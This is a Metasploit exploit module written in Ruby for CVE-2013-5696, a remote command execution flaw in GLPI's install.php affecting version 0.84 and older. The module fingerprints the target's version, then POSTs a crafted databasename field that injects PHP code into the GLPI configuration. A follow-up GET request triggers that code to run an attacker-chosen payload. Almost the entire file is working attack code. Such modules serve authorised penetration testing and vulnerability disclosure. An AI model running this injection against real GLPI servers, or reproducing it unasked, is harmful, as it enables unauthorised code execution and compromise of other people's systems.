##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'securerandom'
class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'GLPI install.php Remote Command Execution',
      'Description'    => %q{
        This module exploits an arbitrary command execution vulnerability in the
        GLPI 'install.php' script.
        },
        'Author'         =>
          [
            'Navixia SA, research[at]navixia.com',
          ],
        'License'        => MSF_LICENSE,
        'References'     =>
          [
            [ 'CVE', '2013-5696' ],
            [ 'URL', 'https://www.navixia.com/blog/entry/navixia-finds-critical-vulnerabilities-in-glpi-cve-2013-5696.html' ],
            [ 'URL', 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2013-5696' ],
            [ 'URL', 'http://www.glpi-project.org/forum/viewtopic.php?id=33762' ],
          ],
        'Privileged'     => false,
        'Platform'       => ['php'],
        'Payload'        => { 'Space' => 4000, 'BadChars' => "#", 'DisableNops' => true,
          'Keys' => ['php'] },
        'Arch'           => ARCH_PHP,
        'Targets'        => [[ 'GLPI 0.84 or older', { }]],
        'DisclosureDate' => 'Sep 12 2013',
        'DefaultTarget'  => 0))

        register_options(
          [
            OptString.new('TARGETURI', [true, 'The base path to GLPI', '/glpi/'])
          ], self.class)
  end

	def check
    # Check if the GLPI instance is vulnerable
		uri = target_uri.path
		uri << '/' if uri[-1,1] != '/'

		res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(uri, 'index.php'),
		})

    if res and res.code == 200
      reversion='(version)(\\s+)(.*)(\\s+)(Copyright)'

      re=(reversion)
      m=Regexp.new(re,Regexp::IGNORECASE);

      if m.match(res.body)

        versiontab=m.match(res.body)[3].split('.');
        if Integer(versiontab[0]) == 0 and Integer(versiontab[1]) <= 84
          if versiontab[2] == nil or  Integer(versiontab[2]) <2
              print_good("Detected Version : #{m.match(res.body)[3]}")
              return Exploit::CheckCode::Appears
          end
        end
      print_error("Detected Version : #{m.match(res.body)[3]}")
      else
        return Exploit::CheckCode::Unknown
      end
    end
    return Exploit::CheckCode::Safe
	end

  def exploit
      uri = target_uri.path
      @rand_arg=SecureRandom.hex
      send_request_cgi({
        'method'    => 'POST',
        'uri'       => normalize_uri(uri, 'install/install.php'),
        'vars_post' =>
        {
          'install'=>'update_1',
          'db_host'=>'localhost',
          'db_user'=>'root',
          'db_pass'=>'root',
          'databasename'=>"'; } if(isset($_GET['#{@rand_arg}'])){ #{payload.encoded} } /*"
        }
         })

      send_request_cgi(
        opts={
          'method'    => 'GET',
          'uri'       => normalize_uri(uri, 'index.php'),
          'vars_get'  =>
          {
            @rand_arg => '1',
          }
        },timeout = 1)
      handler
  end
end
